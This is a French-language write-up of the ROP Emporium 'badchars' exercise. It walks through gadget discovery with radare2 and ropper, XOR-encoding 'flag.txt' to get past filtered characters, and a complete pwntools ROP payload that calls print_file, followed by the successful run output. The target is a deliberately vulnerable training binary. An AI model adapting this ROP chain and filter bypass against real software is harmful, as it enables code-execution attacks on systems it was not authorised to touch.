# 05: badchars 



On veut écrire flag.txt en mémoire, et appeler print_file() 
Les caractères 'x', 'g', 'a', '.' sont filtrés.
On va xor encoder notre message 


## Xor Bypass 

On calcule tous les xor de 1 à 255, et on prend lepremier qui n'a aucun char interdit
```
$ ./exploit.py
^2
b'646e63652c767a76'
```

Un flag.txt Xor 2 = dnce,vzv => 0x646e63652c767a76 permet de bypass le filtre  
xored_string=p64(0x646e63652c767a76)

## where 

```
$ r2 badchars
[0x00400520]> aaaa
[x] Analyze all flags starting with sym. and entry0 (aa)
[x] Analyze function calls (aac)
[x] Analyze len bytes of instructions for references (aar)
[x] Check for objc references
[x] Check for vtables
[x] Type matching analysis for all functions (aaft)
[x] Propagate noreturn information
[x] Use -AA or aaaa to perform additional experimental analysis.
[x] Finding function preludes
[x] Enable constraint types analysis for variables
[0x00400520]> iS
[Sections]

nth paddr        size vaddr       vsize perm name
―――――――――――――――――――――――――――――――――――――――――――――――――
...
18  0x00000df0    0x8 0x00600df0    0x8 -rw- .init_array
19  0x00000df8    0x8 0x00600df8    0x8 -rw- .fini_array
20  0x00000e00  0x1f0 0x00600e00  0x1f0 -rw- .dynamic
21  0x00000ff0   0x10 0x00600ff0   0x10 -rw- .got
22  0x00001000   0x28 0x00601000   0x28 -rw- .got.plt
23  0x00001028   0x10 0x00601028   0x10 -rw- .data
24  0x00001038    0x0 0x00601038    0x8 -rw- .bss
...
```

writable_addr = p64(0x00601038)

## gadget: mov

```
$ ropper -f badchars | grep mov
[INFO] Load gadgets from cache
[LOAD] loading... 100%
[LOAD] removing double gadgets... 100%
0x0000000000400635: mov dword ptr [rbp], esp; ret; 
...
0x0000000000400634: mov qword ptr [r13], r12; ret; 
...
```
gadget_mov_r13_r12 = p64(0x0000000000400634)


## gadget: xor 

```
$ ropper -f badchars | grep xor
[INFO] Load gadgets from cache
[LOAD] loading... 100%
[LOAD] removing double gadgets... 100%
0x0000000000400628: xor byte ptr [r15], r14b; ret; 
0x0000000000400629: xor byte ptr [rdi], dh; ret; 
```

gadget_xor_r15_r14 = p64(0x0000000000400628)


## gadget: pop 

```
$ ropper -f badchars | grep r12
[INFO] Load gadgets from cache
[LOAD] loading... 100%
[LOAD] removing double gadgets... 100%
0x0000000000400634: mov qword ptr [r13], r12; ret; 
0x00000000004005e4: or r12b, byte ptr [r8]; add byte ptr [rcx], al; pop rbp; ret; 
0x000000000040069c: pop r12; pop r13; pop r14; pop r15; ret; 
0x000000000040069b: pop rbp; pop r12; pop r13; pop r14; pop r15; ret; 
```

gadget_pop_r12_r13_r14_r15 = p64(0x000000000040069c)

```
$ ropper -f badchars | grep r14
[INFO] Load gadgets from cache
[LOAD] loading... 100%
[LOAD] removing double gadgets... 100%
0x000000000040062c: add byte ptr [r15], r14b; ret; 
0x000000000040069c: pop r12; pop r13; pop r14; pop r15; ret; 
0x000000000040069e: pop r13; pop r14; pop r15; ret; 
0x00000000004006a0: pop r14; pop r15; ret; 
0x000000000040069b: pop rbp; pop r12; pop r13; pop r14; pop r15; ret; 
0x000000000040069f: pop rbp; pop r14; pop r15; ret; 
0x000000000040069d: pop rsp; pop r13; pop r14; pop r15; ret; 
0x0000000000400630: sub byte ptr [r15], r14b; ret; 
0x0000000000400628: xor byte ptr [r15], r14b; ret; 
```

gadget_pop_r14_r15 =p64(0x00000000004006a0)


## fct 

```
[0x00400520]> afl
0x00400520    1 42           entry0
0x004004d8    3 23           sym._init
0x004006b4    1 9            sym._fini
0x00400560    4 42   -> 37   sym.deregister_tm_clones
0x00400590    4 58   -> 55   sym.register_tm_clones
0x004005d0    3 34   -> 29   entry.fini0
0x00400600    1 7            entry.init0
0x00400617    1 17           sym.usefulFunction
0x00400510    1 6            sym.imp.print_file
0x004006b0    1 2            sym.__libc_csu_fini
0x00400640    4 101          sym.__libc_csu_init
0x00400550    1 2            sym._dl_relocate_static_pie
0x00400607    1 16           main
0x00400500    1 6            sym.imp.pwnme
```
print_file = p64(0x00400510)

## Gadgets to set rdi

```$ ropper -f badchars | grep rdi
[INFO] Load gadgets from cache
[LOAD] loading... 100%
[LOAD] removing double gadgets... 100%
0x000000000040062d: add byte ptr [rdi], dh; ret; 
0x00000000004006a3: pop rdi; ret; 
0x0000000000400631: sub byte ptr [rdi], dh; ret; 
0x0000000000400629: xor byte ptr [rdi], dh; ret; 
```
gadget_pop_rdi = p64(0x00000000004006a3)

## Payload 

```
offset=40

xored_string=p64(0x646e63652c767a76, endianness="big")
xor_value=p64(2)
writable_addr = p64(0x00601038)
gadget_pop_r12_r13_r14_r15 = p64(0x000000000040069c)
gadget_mov_r13_r12 = p64(0x0000000000400634)
gadget_pop_r14_r15 = p64(0x00000000004006a0)
gadget_xor_r15_r14 = p64(0x0000000000400628)
gadget_pop_rdi = p64(0x00000000004006a3)
print_file = p64(0x00400510)

r12 = xored_string
r13 = writable_addr
r14 = xor_value
r15 = writable_addr

# Write dnce,vzv in .bss
payload = b'A'*offset \
    + gadget_pop_r12_r13_r14_r15 + r12 + r13 + r14 + r15 \
    + gadget_mov_r13_r12 

# ^2 each char
for i in range(8):
    payload +=  gadget_pop_r14_r15 + r14 + p64(0x00601038+i) \
    + gadget_xor_r15_r14    

# Call print_file
payload += gadget_pop_rdi + writable_addr \
    + print_file
```


## exploit 

```
$ ./exploit.py 
flag.txt^2=dnce,vzv
b'646e63652c767a76'
[*] '/home/yolo/yolo/BufferOverflows/ropemporium/05_badchars/badchars'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
    RUNPATH:  b'.'
[*] 0x400510 print_file
[+] Starting local process '/home/yolo/yolo/BufferOverflows/ropemporium/05_badchars/badchars': pid 154886
[*] Switching to interactive mode
badchars by ROP Emporium
x86_64

badchars are: 'x', 'g', 'a', '.'
> Thank you!
ROPE{a_placeholder_32byte_flag!}
[*] Got EOF while reading in interactive
$  
```